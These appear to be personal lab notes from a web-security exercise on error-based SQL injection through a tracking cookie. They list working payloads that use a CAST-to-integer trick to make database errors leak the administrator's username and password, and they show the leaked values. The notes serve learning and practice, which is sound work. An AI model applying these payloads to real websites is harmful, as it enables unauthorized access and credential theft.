1) take a request and change the cookie TrackerId to 
...' and '1' = '1' --

we can see here that it works but nothing is visible

but if we do 
...' ' --

we can see that the webiste shows the sql error in the response

2) try to extract information using a crafted sql that triggers an error
...' AND 1=CAST((SELECT username FROM users limit 1) AS int)-- 
    but the query is truncated and we receive an error from which is possible to understand it

but if we delete completely the trakingid:
' AND 1=CAST((SELECT username FROM users limit 1) AS int)--

we obtain an error that leaks the first username of the table

ERROR: invalid input syntax for type integer: "administrator"



3) we know that the first username is administrator so we cna extract his password with
' AND 1=CAST((SELECT password FROM users limit 1) AS int)--

ERROR: invalid input syntax for type integer: "8rk7zsiqeliavkq42g25"


NOTE:
we need to use 1=CAST(...)  because the previous query terminates with a where so we need another boolena statement with the AND

we use CAST((SELECT username FROM users limit 1) AS int) in order to force the conversion of username that is a string into a int. this triggers an error basically
